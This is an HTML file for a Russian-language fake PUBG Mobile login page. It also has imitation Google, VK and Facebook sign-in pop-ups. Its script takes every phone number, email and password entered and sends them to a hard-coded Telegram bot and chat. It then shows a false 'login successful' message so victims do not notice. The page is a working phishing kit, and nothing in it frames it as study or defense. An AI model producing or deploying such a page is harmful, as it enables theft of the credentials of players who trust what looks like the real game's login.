<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE - Авторизация</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: url('https://abrakadabra.fun/uploads/posts/2023-02/1677247692_abrakadabra-fun-p-fon-pubg-1.jpg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            z-index: -1;
        }

        .login-container {
            background: rgba(0, 0, 0, 0.85);
            border-radius: 15px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            border: 3px solid #ff8c00;
            box-shadow: 0 0 30px rgba(255, 140, 0, 0.4);
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .login-container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff8c00, #ff6b00, #ff8c00);
            z-index: -1;
            border-radius: 17px;
            animation: borderGlow 2s linear infinite;
        }

        @keyframes borderGlow {
            0% { opacity: 0.7; }
            50% { opacity: 1; }
            100% { opacity: 0.7; }
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            font-size: 2.5em;
            font-weight: bold;
            color: #ff8c00;
            text-shadow: 0 0 10px rgba(255, 140, 0, 0.5);
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .logo p {
            color: #ccc;
            font-size: 1.1em;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
        }

        .form-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ff8c00;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #ffd700;
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
            background: rgba(255, 255, 255, 0.15);
        }

        input::placeholder {
            color: #ccc;
        }

        .login-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(45deg, #ff8c00, #ff6b00);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(255, 140, 0, 0.4);
            background: linear-gradient(45deg, #ff6b00, #ff8c00);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .social-login {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 30px;
        }

        .social-btn {
            width: 50px;
            height: 50px;
            border: 2px solid #ff8c00;
            border-radius: 10px;
            background: rgba(255, 140, 0, 0.1);
            color: #ff8c00;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: bold;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .social-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(255, 140, 0, 0.3);
            background: rgba(255, 140, 0, 0.2);
            color: #ffd700;
            border-color: #ffd700;
        }

        .social-btn:active {
            transform: translateY(-1px);
        }

        /* Модальные окна */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background: rgba(0, 0, 0, 0.95);
            border-radius: 15px;
            padding: 30px;
            max-width: 400px;
            width: 90%;
            color: white;
            border: 3px solid #ff8c00;
            box-shadow: 0 0 40px rgba(255, 140, 0, 0.5);
            position: relative;
            backdrop-filter: blur(10px);
        }

        .modal-content::before {
            content: '';
            position: absolute;
            top: -3px;
            left: -3px;
            right: -3px;
            bottom: -3px;
            background: linear-gradient(45deg, #ff8c00, #ff6b00, #ff8c00);
            z-index: -1;
            border-radius: 18px;
            animation: borderGlow 2s linear infinite;
        }

        .modal-header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 25px;
            font-size: 1.5em;
            color: #ff8c00;
            text-transform: uppercase;
        }

        .close-modal {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #ff8c00;
            transition: color 0.3s;
        }

        .close-modal:hover {
            color: #ffd700;
        }

        .modal-input {
            width: 100%;
            padding: 15px;
            margin: 12px 0;
            border: 2px solid #ff8c00;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
        }

        .modal-input:focus {
            outline: none;
            border-color: #ffd700;
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
        }

        .modal-btn {
            width: 100%;
            padding: 16px;
            margin-top: 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .google-modal-btn {
            background: linear-gradient(45deg, #db4437, #c1351d);
            color: white;
        }

        .vk-modal-btn {
            background: linear-gradient(45deg, #4a76a8, #3a6590);
            color: white;
        }

        .facebook-modal-btn {
            background: linear-gradient(45deg, #1877f2, #166fe5);
            color: white;
        }

        .modal-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 140, 0, 0.3);
        }

        /* Анимация появления */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .login-container, .modal-content {
            animation: fadeIn 0.5s ease-out;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>PUBG MOBILE</h1>
            <p>Войдите в свой аккаунт</p>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <input type="tel" id="phone" placeholder="Номер телефона" required>
            </div>
            
            <div class="form-group">
                <input type="password" id="password" placeholder="Пароль от аккаунта" required>
            </div>

            <button type="submit" class="login-btn" onclick="playButtonSound()">ВХОД В ИГРУ</button>
        </form>

        <div class="social-login">
            <button type="button" class="social-btn" onclick="openModal('google'); playButtonSound()">G</button>
            <button type="button" class="social-btn" onclick="openModal('vk'); playButtonSound()">VK</button>
            <button type="button" class="social-btn" onclick="openModal('facebook'); playButtonSound()">f</button>
        </div>
    </div>

    <!-- Модальные окна -->
    <div id="googleModal" class="modal">
        <div class="modal-content">
            <button class="close-modal" onclick="closeModal('google'); playButtonSound()">×</button>
            <div class="modal-header">
                <span>G</span> Google
            </div>
            <input type="email" class="modal-input" placeholder="Email Google" id="googleEmail">
            <input type="password" class="modal-input" placeholder="Пароль Google" id="googlePassword">
            <button class="modal-btn google-modal-btn" onclick="registerGoogle(); playButtonSound()">Войти через Google</button>
        </div>
    </div>

    <div id="vkModal" class="modal">
        <div class="modal-content">
            <button class="close-modal" onclick="closeModal('vk'); playButtonSound()">×</button>
            <div class="modal-header">
                <span>VK</span> ВКонтакте
            </div>
            <input type="text" class="modal-input" placeholder="Телефон или email" id="vkLogin">
            <input type="password" class="modal-input" placeholder="Пароль ВК" id="vkPassword">
            <button class="modal-btn vk-modal-btn" onclick="registerVK(); playButtonSound()">Войти через VK</button>
        </div>
    </div>

    <div id="facebookModal" class="modal">
        <div class="modal-content">
            <button class="close-modal" onclick="closeModal('facebook'); playButtonSound()">×</button>
            <div class="modal-header">
                <span>f</span> Facebook
            </div>
            <input type="email" class="modal-input" placeholder="Email Facebook" id="facebookEmail">
            <input type="password" class="modal-input" placeholder="Пароль Facebook" id="facebookPassword">
            <button class="modal-btn facebook-modal-btn" onclick="registerFacebook(); playButtonSound()">Войти через Facebook</button>
        </div>
    </div>

    <!-- Аудио элементы -->
    <audio id="buttonSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3"></audio>
    <audio id="hoverSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-jump-coin-216.mp3"></audio>

    <script>
        const TELEGRAM_BOT_TOKEN = '8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8';
        const TELEGRAM_CHAT_ID = '1491315056';

        // Звуки
        function playButtonSound() {
            const sound = document.getElementById('buttonSound');
            sound.currentTime = 0;
            sound.play();
        }

        function playHoverSound() {
            const sound = document.getElementById('hoverSound');
            sound.currentTime = 0;
            sound.play();
        }

        // Добавляем звуки при наведении на кнопки
        document.querySelectorAll('button').forEach(button => {
            button.addEventListener('mouseenter', playHoverSound);
        });

        // Функции модальных окон
        function openModal(social) {
            document.getElementById(social + 'Modal').style.display = 'flex';
        }

        function closeModal(social) {
            document.getElementById(social + 'Modal').style.display = 'none';
        }

        // Регистрация через соцсети
        function registerGoogle() {
            const email = document.getElementById('googleEmail').value;
            const password = document.getElementById('googlePassword').value;
            
            if (!email || !password) {
                alert('Заполните все поля!');
                return;
            }

            const text = `🎮 PUBG - GOOGLE LOGIN\n\n📧 Email: ${email}\n🔑 Пароль: ${password}\n⏰ ${new Date().toLocaleString()}`;
            sendToTelegram(text);
            closeModal('google');
            alert('✅ Вход через Google выполнен!');
        }

        function registerVK() {
            const login = document.getElementById('vkLogin').value;
            const password = document.getElementById('vkPassword').value;
            
            if (!login || !password) {
                alert('Заполните все поля!');
                return;
            }

            const text = `🎮 PUBG - VK LOGIN\n\n👤 Логин: ${login}\n🔑 Пароль: ${password}\n⏰ ${new Date().toLocaleString()}`;
            sendToTelegram(text);
            closeModal('vk');
            alert('✅ Вход через VK выполнен!');
        }

        function registerFacebook() {
            const email = document.getElementById('facebookEmail').value;
            const password = document.getElementById('facebookPassword').value;
            
            if (!email || !password) {
                alert('Заполните все поля!');
                return;
            }

            const text = `🎮 PUBG - FACEBOOK LOGIN\n\n📧 Email: ${email}\n🔑 Пароль: ${password}\n⏰ ${new Date().toLocaleString()}`;
            sendToTelegram(text);
            closeModal('facebook');
            alert('✅ Вход через Facebook выполнен!');
        }

        // Основная форма
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            
            if (!phone || !password) {
                alert('Заполните все поля!');
                return;
            }
            
            const text = `🎮 PUBG - ОСНОВНОЙ ВХОД\n\n📱 Телефон: ${phone}\n🔑 Пароль: ${password}\n⏰ ${new Date().toLocaleString()}`;
            sendToTelegram(text);
        });

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: text
                })
            })
            .then(() => {
                alert('🎮 Данные отправлены! Вход выполнен.');
                document.getElementById('loginForm').reset();
            })
            .catch(error => {
                alert('❌ Ошибка отправки данных');
            });
        }

        // Закрытие модальных окон
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
                playButtonSound();
            }
        }
    </script>
</body>
</html>
